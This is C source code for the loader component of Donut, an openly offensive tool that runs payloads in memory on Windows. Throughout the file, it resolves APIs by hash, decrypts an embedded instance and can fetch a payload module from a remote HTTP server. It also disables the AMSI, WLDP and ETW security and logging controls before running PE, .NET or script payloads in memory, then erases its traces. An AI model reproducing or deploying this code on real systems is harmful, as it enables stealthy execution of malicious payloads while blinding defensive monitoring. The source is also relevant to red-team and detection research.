/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "loader.h"

DWORD MainProc(PDONUT_INSTANCE inst);

HANDLE DonutLoader(PDONUT_INSTANCE inst) {
    CreateThread_t     _CreateThread;
    GetThreadContext_t _GetThreadContext;
    GetCurrentThread_t _GetCurrentThread;
    NtContinue_t       _NtContinue;
    ULONG64            hash;
    HANDLE             h = NULL;
    CONTEXT            c;
    LPVOID             host;
    
    DPRINT("sizeof(DONUT_INSTANCE)        : %zu\n", sizeof(DONUT_INSTANCE));
    DPRINT("offsetof(DONUT_INSTANCE, api) : %zu\n", offsetof(DONUT_INSTANCE, api));
    
    // create thread and execute original entrypoint?
    if(inst->oep != 0) {
      DPRINT("Resolving address of CreateThread");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _CreateThread = (CreateThread_t)xGetProcAddressByHash(inst, hash, inst->iv);
      
      // api resolved?
      if(_CreateThread != NULL) {
        // create new thread
        DPRINT("Creating new thread");
        h = _CreateThread(NULL, 0, ADR(LPTHREAD_START_ROUTINE, MainProc), (LPVOID)inst, 0, NULL);
      } else {
        DPRINT("FAILED");
        return (HANDLE)-1;
      }
      
      DPRINT("Resolving address of NtContinue");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _NtContinue = (NtContinue_t)xGetProcAddressByHash(inst, hash, inst->iv);
      
      DPRINT("Resolving address of GetThreadContext");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _GetThreadContext = (GetThreadContext_t)xGetProcAddressByHash(inst, hash, inst->iv);

      DPRINT("Resolving address of GetCurrentThread");
      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddressByHash(inst, hash, inst->iv);

      // get the base address of the host process's executable
      host = inst->api.GetModuleHandle(NULL);
      
      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
        c.ContextFlags = CONTEXT_FULL;
        _GetThreadContext(_GetCurrentThread(), &c);
        #ifdef _WIN64
          c.Rip = RVA2VA(DWORD64, host, inst->oep);
          c.Rsp &= -16;
        #else
          c.Eip = RVA2VA(DWORD64, host, inst->oep);
          c.Esp &= -4;
        #endif
        DPRINT("Calling NtContinue");
        //__debugbreak();
        _NtContinue(&c, FALSE);
      }
    } else {
      // execute in existing thread
      MainProc(inst);
    }
    return h;
}

DWORD MainProc(PDONUT_INSTANCE inst) {
    ULONG                i, ofs, wspace, fspace, len;
    ULONG64              sig;
    DONUT_ASSEMBLY       assembly;
    PDONUT_MODULE        mod, unpck;
    VirtualAlloc_t       _VirtualAlloc;
    VirtualFree_t        _VirtualFree;
    RtlExitUserProcess_t _RtlExitUserProcess;
    LPVOID               pv, ws;
    ULONG64              hash;
    BOOL                 disabled, term;
    NTSTATUS             nts;
    PCHAR                str;
    CHAR                 path[MAX_PATH];
    
    DPRINT("Maru IV : %" PRIX64, inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualAlloc) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddressByHash(inst, hash, inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualFree) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
    _VirtualFree  = (VirtualFree_t) xGetProcAddressByHash(inst, hash,  inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.RtlExitUserProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddressByHash(inst, hash,  inst->iv);
    
    // failed to resolve any?
    if(_VirtualAlloc       == NULL || 
       _VirtualFree        == NULL || 
       _RtlExitUserProcess == NULL) 
    {
      DPRINT("FAILED!.");
      return -1;
    }
    
    DPRINT("VirtualAlloc : %p VirtualFree : %p", 
      (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
    
    DPRINT("Allocating %i bytes of RW memory", inst->len);
    pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if(pv == NULL) {
      DPRINT("Memory allocation failed...");
      // terminate host process?
      if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
        DPRINT("Terminating host process");
        _RtlExitUserProcess(0);
      }
      return -1;
    }
    DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
    Memcpy(pv, inst, inst->len);
    inst = (PDONUT_INSTANCE)pv;
    
    DPRINT("Zero initializing PDONUT_ASSEMBLY");
    Memset(&assembly, 0, sizeof(assembly));
    
    // if encryption used
    if(inst->entropy == DONUT_ENTROPY_DEFAULT) {
      PBYTE inst_data;
      // load pointer to data just past len + key
      inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
      
      DPRINT("Decrypting %li bytes of instance", inst->len);
      
      donut_decrypt(inst->key.mk, 
              inst->key.ctr, 
              inst_data, 
              inst->len - offsetof(DONUT_INSTANCE, api_cnt));
      
      DPRINT("Generating hash to verify decryption");
      ULONG64 mac = maru(inst->sig, inst->iv);
      DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
      
      if(mac != inst->mac) {
        DPRINT("Decryption of instance failed");
        goto erase_memory;
      }
    }
    DPRINT("Resolving LoadLibraryA");
    
    inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
    if(inst->api.addr[0] == NULL) return -1;
    
    str = (PCHAR)inst->dll_names;
    
    // load the DLL required
    for(;;) {
      // store string until null byte or semi-colon encountered
      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
      // nothing stored? exit loop
      if(i == 0) break;
      // skip name plus one for separator
      str += (i + 1);
      // store null terminator
      path[i] = '\0';
      xGetLibAddress(inst, path);
    }
    
    DPRINT("Resolving %i API", inst->api_cnt);
    
    for(i=1; i<inst->api_cnt; i++) {
      DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
        
      inst->api.addr[i] = xGetProcAddressByHash(inst, inst->api.hash[i], inst->iv);
      
      // if resolving API failed
      if(inst->api.addr[i] == NULL) {
        DPRINT("Failed to resolve an API");
        // make an exception for CLRCreateInstance
        // for older versions of dotnet
        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CLRCreateInstance) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
        
        if(inst->api.hash[i] == hash) {
          DPRINT("CLRCreateInstance isn't available. Will try CorBindToRuntime.");
          continue;
        }
        // else, bail out
        goto erase_memory;
      }
    }
    
    if(inst->type == DONUT_INSTANCE_HTTP) {
      DPRINT("Module is stored on remote HTTP server.");
      if(!DownloadFromHTTP(inst)) goto erase_memory;
      mod = inst->module.p;
    } else
    if(inst->type == DONUT_INSTANCE_DNS) {
      DPRINT("Module is stored on remote DNS server. (Currently unsupported)");
      goto erase_memory;
      //if(!DownloadFromDNS(inst)) goto erase_memory;
      mod = inst->module.p;
    } else
    if(inst->type == DONUT_INSTANCE_EMBED) {
      DPRINT("Module is embedded.");
      mod = (PDONUT_MODULE)&inst->module.x;
    }
    
    // try bypassing AMSI, WLDP, and ETW?
    if(inst->bypass != DONUT_BYPASS_NONE) {
      // Try to disable AMSI
      disabled = DisableAMSI(inst);
      DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
        goto erase_memory;
      
      // Try to disable WLDP
      disabled = DisableWLDP(inst);
      DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
      if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
        goto erase_memory;

      // Try to disable ETW
      disabled = DisableETW(inst);
      DPRINT("DisableETW %s", disabled ? "OK" : "FAILED");
      if (!disabled && inst->bypass == DONUT_BYPASS_ABORT)
          goto erase_memory;
    }
    
    // module is compressed?
    if(mod->compress != DONUT_COMPRESS_NONE) {
      DPRINT("Compression engine is %"PRIx32, mod->compress);
      
      DPRINT("Allocating %zd bytes of memory for decompressed file and module information", 
        mod->len + sizeof(DONUT_MODULE));
      
      // allocate memory for module information + size of decompressed data
      unpck = (PDONUT_MODULE)_VirtualAlloc(
        NULL, ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
      if(unpck == NULL) goto erase_memory;
      
      // copy the existing information to new block
      DPRINT("Duplicating DONUT_MODULE");
      Memcpy(unpck, mod, sizeof(DONUT_MODULE));
      
      // decompress module data into new block
      DPRINT("Decompressing %"PRId32 " -> %"PRId32, mod->zlen, mod->len);
      
      if(mod->compress == DONUT_COMPRESS_LZNT1  ||
         mod->compress == DONUT_COMPRESS_XPRESS)
      {
        DPRINT("Decompressing with RtlDecompressBuffer(%s)",
          mod->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : "XPRESS");
                
        nts = inst->api.RtlDecompressBuffer(
              (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
              (PUCHAR)unpck->data, mod->len, 
              (PUCHAR)&mod->data, mod->zlen, &len);
              
        if(nts == 0) {
          // assign pointer to mod
          mod = unpck;
        } else {
          DPRINT("RtlDecompressBuffer failed with %"PRIX32, nts);
          goto erase_memory;
        }
      } else if(mod->compress == DONUT_COMPRESS_APLIB) {
        DPRINT("Decompressing with aPLib");
        aP_depack((PUCHAR)mod->data, (PUCHAR)unpck->data);
        DPRINT("Done");
        mod = unpck;
      } else {
        //
      }
    }
    DPRINT("Checking type of module");
    
    // unmanaged EXE/DLL?
    if(mod->type == DONUT_MODULE_DLL ||
       mod->type == DONUT_MODULE_EXE) {
      RunPE(inst, mod);
    } else
    // .NET EXE/DLL?
    if(mod->type == DONUT_MODULE_NET_DLL || 
       mod->type == DONUT_MODULE_NET_EXE)
    {
      if(LoadAssembly(inst, mod, &assembly)) {
        RunAssembly(inst, mod, &assembly);
      }
      FreeAssembly(inst, &assembly);
    } else 
    // vbs or js?
    if(mod->type == DONUT_MODULE_VBS ||
       mod->type == DONUT_MODULE_JS)
    {
      RunScript(inst, mod);
    }

    // if user specified to block instead of exit, then block infinitely before cleanup
    if (inst->exit_opt == DONUT_OPT_EXIT_BLOCK) {
      DPRINT("Execution complete. Blocking indefintely.");
      for (int x = 0; ; x--) {
        x += 1;
      }
    }
    
erase_memory:
    // if module was downloaded
    if(inst->type == DONUT_INSTANCE_HTTP || 
       inst->type == DONUT_INSTANCE_DNS) 
    {
      if(inst->module.p != NULL) {
        // overwrite memory with zeros
        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
        
        // free memory
        _VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
        inst->module.p = NULL;
      }
    }
    
    // should we call RtlExitUserProcess?
    term = (BOOL) (inst->exit_opt == DONUT_OPT_EXIT_PROCESS);
    
    DPRINT("Erasing RW memory for instance");
    Memset(inst, 0, inst->len);
    
    DPRINT("Releasing RW memory for instance");
    _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
    
    if(term) {
      DPRINT("Terminating host process");
      // terminate host process
      _RtlExitUserProcess(0);
    }
    DPRINT("Returning to caller");
    // return to caller, which invokes RtlExitUserThread
    return 0;
}

int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME]) {
    return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
      -1, output, DONUT_MAX_NAME);
}

#include "peb.c"             // resolve functions in export table
#include "http_client.c"     // Download module from HTTP server
//#include "dns_client.c"      // Download module from DNS server
#include "inmem_dotnet.c"    // .NET assemblies
#include "inmem_pe.c"        // Unmanaged PE/DLL files
#include "inmem_script.c"    // VBS/JS files

#include "bypass.c"          // Bypass AMSI,WLDP, and ETW
#include "getpc.c"           // code stub to return program counter (always at the end!)

// the following code is *only* for development purposes
// given an instance file, it will run as if running on a target system
// attach a debugger to host process
#ifdef DEBUG

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    FILE           *fd;
    struct stat     fs;
    PDONUT_INSTANCE inst;
    DWORD           old;
    HANDLE          h;
    
    if(argc != 2) {
      printf("  [ usage: loader <instance>\n");
      return 0;
    }
    // get size of instance
    if(stat(argv[1], &fs) != 0) {
      printf("  [ unable to obtain size of instance.\n");
      return 0;
    }
    
    // zero size?
    if(fs.st_size == 0) {
      printf("  [ invalid instance.\n");
      return 0;
    }
    
    // try open for reading
    fd = fopen(argv[1], "rb");
    if(fd == NULL) {
      printf("  [ unable to open %s.\n", argv[1]);
      return 0;
    }

    // allocate memory
    inst = (PDONUT_INSTANCE)VirtualAlloc(NULL, fs.st_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if(inst != NULL) {
      fread(inst, 1, fs.st_size, fd);
      
      // change protection to PAGE_EXECUTE_READ
      if(VirtualProtect((LPVOID)inst, fs.st_size, PAGE_EXECUTE_READ, &old)) {
        printf("Running...");
      
        // run payload with instance
        h = DonutLoader(inst);
        
        if(h != (HANDLE)-1 && inst->oep != 0) {
          printf("\nWaiting...");
          WaitForSingleObject(h, INFINITE);
        }
      }
      // deallocate
      VirtualFree((LPVOID)inst, 0, MEM_DECOMMIT | MEM_RELEASE);
    }
    fclose(fd);

    system("pause");
    return 0;
}
#endif
